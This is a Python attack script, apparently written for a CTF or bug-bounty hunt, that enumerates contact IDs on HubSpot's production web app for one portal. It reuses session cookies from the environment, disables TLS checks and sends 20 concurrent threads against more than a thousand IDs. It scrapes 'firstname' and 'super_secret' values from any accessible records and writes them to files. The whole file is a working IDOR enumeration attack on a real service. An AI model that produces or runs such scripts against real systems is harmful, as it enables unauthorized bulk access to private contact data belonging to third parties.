#!/usr/bin/env python3
"""
Mass enumeration of contact IDs
Maybe contact ID 1 isn't accessible, but another ID is
"""

import requests
import os
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("MASS CONTACT ID ENUMERATION")
print("="*80)

session = requests.Session()

# Set cookies
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html',
}

accessible_contacts = []
interesting_responses = []

def check_contact(contact_id):
    """Check if a contact ID is accessible"""
    url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{contact_id}'

    try:
        r = session.get(url, headers=headers, verify=False, timeout=5)

        # Check for different response sizes (might indicate data)
        if r.status_code == 200:
            response_size = len(r.text)

            # Check if response contains actual data (not just the shell)
            if 'firstname' in r.text.lower() or 'super_secret' in r.text.lower():
                # Try to extract values
                patterns = [
                    r'"firstname"\s*:\s*{\s*"value"\s*:\s*"([^"]+)"',
                    r'"super_secret"\s*:\s*{\s*"value"\s*:\s*"([^"]+)"',
                ]

                for pattern in patterns:
                    matches = re.findall(pattern, r.text, re.I)
                    if matches:
                        real_values = [m for m in matches if m.lower() not in ['firstname', 'super_secret', 'text']]
                        if real_values:
                            return {
                                'contact_id': contact_id,
                                'size': response_size,
                                'data_found': True,
                                'values': real_values
                            }

            return {
                'contact_id': contact_id,
                'size': response_size,
                'data_found': False
            }

    except:
        pass

    return None

# Test contact IDs
# Try a range and also some specific patterns
contact_ids_to_test = list(range(1, 1001))  # 1-1000

# Add some larger IDs
contact_ids_to_test.extend([
    10000, 10001, 10002,
    50000, 50001, 50002,
    100000, 100001, 100002,
    1000000, 1000001, 1000002,
])

print(f"\nTesting {len(contact_ids_to_test)} contact IDs...")
print("Looking for accessible contacts with data...\n")

# Use threading for faster enumeration
results = []

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(check_contact, cid): cid for cid in contact_ids_to_test}

    completed = 0

    for future in as_completed(futures):
        completed += 1

        if completed % 100 == 0:
            print(f"Progress: {completed}/{len(contact_ids_to_test)}")

        result = future.result()

        if result:
            results.append(result)

            # Print interesting findings immediately
            if result.get('data_found'):
                print(f"\n*** CONTACT {result['contact_id']} HAS DATA! ***")
                print(f"Values found: {result.get('values')}")

                accessible_contacts.append(result)

print(f"\n" + "="*80)
print("ENUMERATION COMPLETE")
print("="*80)

if accessible_contacts:
    print(f"\n*** FOUND {len(accessible_contacts)} CONTACTS WITH DATA! ***\n")

    for contact in accessible_contacts:
        print(f"\nContact ID: {contact['contact_id']}")
        print(f"  Size: {contact['size']} bytes")
        print(f"  Values: {contact.get('values')}")

        # Check if this is the CTF flag
        if contact.get('values'):
            print(f"\n{'='*80}")
            print(f"*** POTENTIAL CTF FLAG! ***")
            print(f"{'='*80}")
            print(f"Contact ID: {contact['contact_id']}")
            print(f"Firstname: {contact['values'][0] if contact['values'] else 'N/A'}")

            # Save it
            import json
            with open(f'/home/user/Hub/findings/CONTACT_{contact["contact_id"]}_DATA.json', 'w') as f:
                json.dump(contact, f, indent=2)

else:
    print("\nNo accessible contacts with data found.")

    # Check response size distribution
    if results:
        sizes = [r['size'] for r in results]
        avg_size = sum(sizes) / len(sizes)
        print(f"\nAverage response size: {avg_size:.0f} bytes")
        print(f"Min: {min(sizes)}, Max: {max(sizes)}")

        # Look for outliers
        outliers = [r for r in results if abs(r['size'] - avg_size) > 1000]
        if outliers:
            print(f"\nFound {len(outliers)} outliers (unusual response sizes):")
            for outlier in outliers[:10]:
                print(f"  Contact {outlier['contact_id']}: {outlier['size']} bytes")
